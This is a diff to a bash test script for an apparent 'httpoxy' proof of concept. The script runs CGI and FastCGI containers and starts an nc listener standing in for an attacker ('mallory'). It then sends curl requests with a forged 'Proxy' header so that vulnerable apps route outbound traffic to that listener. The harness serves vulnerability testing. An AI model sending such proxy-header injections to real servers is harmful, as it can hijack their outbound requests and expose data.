@@ -1,10 +1,22 @@
 #!/usr/bin/env bash
 
+# as in, the address that docker exposes ports on
+if [ -z $DOCKER_IP ]; then
+    DOCKER_IP=127.0.0.1
+fi
+
+# as in, the address of the host from within the docker containers on the default bridge network
+if [ -z $DOCKER_HOST_IP ]; then
+    DOCKER_HOST_IP=172.17.0.1
+fi
+
 CONTAINER_CGI=go-httpoxy-cgi
 CONTAINER_FCGI=go-httpoxy-fcgi
 
 IMAGE_CGI=go-httpoxy-poc-cgi:latest
 IMAGE_FCGI=go-httpoxy-poc-fcgi:latest
+
+MALLORY_LISTENER_PORT=12345
 
 if [ -z $TEST_PORT_CGI ]; then
     TEST_PORT_CGI=2081
@@ -31,12 +43,12 @@ docker build -f fcgi.dockerfile -t $IMAGE_FCGI . &
 wait
 
 echo "Stopping any previous docker containers"
-docker stop $CONTAINER_CGI 2>/dev/null || \
-    docker kill $CONTAINER_CGI 2>/dev/null || \
-    docker rm   $CONTAINER_CGI 2>/dev/null || \
-    docker stop $CONTAINER_FCGI 2>/dev/null || \
-    docker kill $CONTAINER_FCGI 2>/dev/null || \
-    docker rm   $CONTAINER_FCGI 2>/dev/null || true
+docker stop $CONTAINER_CGI  2>/dev/null || true
+docker kill $CONTAINER_CGI  2>/dev/null || true
+docker rm   $CONTAINER_CGI  2>/dev/null || true
+docker stop $CONTAINER_FCGI 2>/dev/null || true
+docker kill $CONTAINER_FCGI 2>/dev/null || true
+docker rm   $CONTAINER_FCGI 2>/dev/null || true
 
 echo "Starting docker container for cgi"
 docker run -d \
@@ -49,3 +61,31 @@ docker run -d \
     --name $CONTAINER_FCGI \
     -p $TEST_PORT_FCGI:80 \
     $IMAGE_FCGI
+
+echo "Wait a sec for them to dwell"
+sleep 3
+
+echo "Then start the tests"
+
+echo
+echo
+
+echo "---------------------------------------------------------------------------------"
+echo "Testing: cgi"
+
+echo "" > ./cgi-mallory.log
+nc -v -l 12345 > ./cgi-mallory.log &
+curl -X GET -H "Proxy: 172.17.0.1:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_CGI/httpoxy > ./cgi-curl.log
+pkill -f 'nc -v -l 12345'
+
+echo "Result time"
+echo "  Here is the output from the cgi program and apache logs:"
+docker exec $CONTAINER_CGI tail /var/log/apache2/*.log
+
+echo "  And here is what the attacker got (any output here means trouble)"
+cat ./cgi-mallory.log
+echo "---------------------------------------------------------------------------------"
+
+echo
+echo
+
